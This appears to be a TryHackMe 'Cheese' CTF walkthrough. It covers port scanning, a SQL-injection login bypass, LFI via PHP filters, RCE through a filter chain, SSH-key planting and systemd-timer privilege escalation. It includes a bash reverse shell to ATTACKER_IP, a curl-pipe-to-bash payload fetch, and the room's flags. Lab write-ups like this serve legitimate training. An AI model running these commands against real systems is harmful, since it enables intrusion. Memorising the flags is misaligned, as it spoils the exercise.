# CHEESE CTF | TryHackMe Room
![1](./images/0.png)
This walkthrough details the step-by-step process of solving the CHEESE CTF, covering reconnaissance, exploitation, privilege escalation, and ultimately gaining root access. The target machine had several vulnerabilities, including SQL injection, Local File Inclusion (LFI), and misconfigured systemd timers.


### **1. Initial Reconnaissance**

**Port Scanning**

- Used Nmap to scan the first 1000 ports (nmap -p 1-1000 <TARGET_IP>).
![1](./images/1.png)

- Found that FTP (21), SSH (22), and HTTP (80) were open.
- Ran a detailed scan on these ports (nmap -sV -A -p 21,22,80 <TARGET_IP>) to identify services and versions.
![1](./images/2.png)

**FTP Enumeration**

- Attempted to connect via FTP (ftp <TARGET_IP>), but encountered an error.
 ![1](./images/3.png)

Possible issues:
- Anonymous login disabled.
- Credentials required (not yet obtained).

**Web Enumeration (Port 80)**
- Visited http://<TARGET_IP> and inspected the page.
![1](./images/4.png)

- Checked the source code for hidden comments or secrets—nothing found.
![1](./images/5.png)

- Discovered a login page (/login.php). 
![1](./images/6.png)



### **2. Exploiting SQL Injection**
**SQLmap for Automated Testing**

- Ran SQLmap to test for SQLi:
`sqlmap -u "http://<TARGET_IP>/login.php" --forms --batch`
 ![1](./images/7.png)

- Found a SQL injection vulnerability in the login form and the redirection.
 ![1](./images/8.png)

- Extracted database information, including a username (comte) and its password hash.
 ![1](./images/9.png)


**Manual SQL Injection Bypass**

- Used a classic SQLi payload to bypass authentication:
```
Username: comte ' AND 1='1 --
Password: anything
```
   ![1](./images/10.png)

- Successfully logged in and was redirected to a dashboard (/dashboard.php).
 ![1](./images/11.png)



### **3. Exploiting Local File Inclusion (LFI)**
**Testing LFI in the file Parameter**

- Discovered an LFI vulnerability in the file parameter (e.g., ?file=/etc/passwd).
- Retrieved /etc/passwd, confirming user comte exists.
 ![1](./images/12.png)


**Reading PHP Files via Base64 Encoding**
- Used PHP filters to read source code:
`?file=php://filter/convert.base64-encode/resource=secret-script.php`
 ![1](./images/13.png)


- Decoded the Base64 output to analyze secret-script.php.
 ![1](./images/14.png)


**Log Poisoning → RCE**

- Since the server used PHP, leveraged PHP wrappers for RCE:
Wrote a malicious payload(revshell) with this bash reverse shell.
`bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` 
- I used the php-filter-chain script from the github to generate the filters to upload 
[🔗 Github link for the script ](https://github.com/synacktiv/php_filter_chain_generator.git)
using command

`python3 php_filter_chain_generator.py --chain '<?= 'curl -s -L <Attacker_IP>/<payload name>|bash' ?>'`
 ![1](./images/15.png)

- Hosted it on a local server and triggered it via LFI.
`python3 -m http.server 80`
- Set up a listener  and received a shell.
`nc -lvnp <port>`
 ![1](./images/16.png)


**User Flag**
- Found the user.txt in the home/comte directory but it had no permissions for us. as we are logged in as `www-data`
 ![1](./images/17.png)

- Found that /home/comte/.ssh/ had write permissions.
 ![1](./images/18.png)

- Generated an SSH key pair (ssh-keygen).
 ![1](./images/19.png)

- Copied the public key (.pub) into authorized_keys.
 ![1](./images/20.png)

- Logged in via SSH and obtained the user flag.
`ssh comte@<TARGET_IP>`
 ![1](./images/21.png)
`THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`


### **4. Privilege Escalation (User → Root)**
**Abusing Systemd Timer Privileges**
- Checked sudo privileges (sudo -l), found systemctl access.
 ![1](./images/22.png)
- Discovered a misconfigured systemd timer (exploit.timer). and Modified the timer to execute immediately:
```
OnBootSec=0  
OnUnitActiveSec=0  
```
 ![1](./images/23.png)


- Found the services it will triggered

 ![1](./images/24.png)

- I looked in the .services and then I started the timer.
`sudo systemctl start exploit.timer`
 ![1](./images/25.png)


**Reading Root Flag via xxd**
- Found that xxd (a hexdump utility) saved as a copy had SUID permissions.
 ![1](./images/26.png)

- Used xxd to read /root/root.txt:
`xxd "/root/root.txt" | xxd -r`
 ![1](./images/27.png)
`THM{dca75486094810807faf4b7b0a929b11e5e0167c}`
